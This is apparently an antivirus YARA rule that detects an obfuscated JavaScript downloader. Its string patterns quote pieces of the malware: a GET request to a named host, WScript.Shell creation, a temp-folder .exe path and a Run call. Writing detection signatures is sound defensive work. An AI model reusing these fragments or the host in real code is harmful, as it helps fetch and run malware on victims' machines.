rule sig_20160330_7dedeea5f7928b30aceafde806c1e399 {
  meta:
    description = "datamaliciousorder - file 20160330_7dedeea5f7928b30aceafde806c1e399.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0e178f513079035d56a942835d73f16d58e0effbe9bf516aba20cec0f586ea19"

  strings:
    $s1  = "_IX[_M0](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "function _R0(_ES, _TO){_SH = _SH * 1; return _ES - _TO;};" fullword ascii
    $s3  = "var _J0 = function _M() {return WScript[_U](\"WScript\"+\".Shell\");}(), _HL = 11;" fullword ascii
    $s4  = "if (_IX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _R(){return _DE0 + \"\";};" fullword ascii
    $s6  = "function _IF() {return _J0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7ZoFzAMCj.ex\" + \"e\";};" fullword ascii
    $s7  = "function _YU(_C0){_J0[\"Run\"](_C0, _SH, _SH);};" fullword ascii
    $s8  = "function _B() {return ((_J == true) && (_J == _DF)) ? 1 : _SH;};" fullword ascii
    $s9  = "return _R0(_GT, _N);" fullword ascii
    $s10 = "function _ER()" fullword ascii
    $s11 = "function _C(){return _U;};" fullword ascii
    $s12 = "function _LR(_G) {var _E = (1, 2, 3, 4, 5, _G); return _E;};" fullword ascii
    $s13 = "var _SD = new this[\"Date\"]();" fullword ascii
    $s14 = "function _GQ(){return 22;};" fullword ascii
    $s15 = " while (_B0){" fullword ascii
    $s16 = "var _J = false;" fullword ascii
    $s17 = "_J = true; " fullword ascii
    $s18 = "_DF = true; " fullword ascii
    $s19 = "var _WY = false;" fullword ascii
    $s20 = "var _DF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}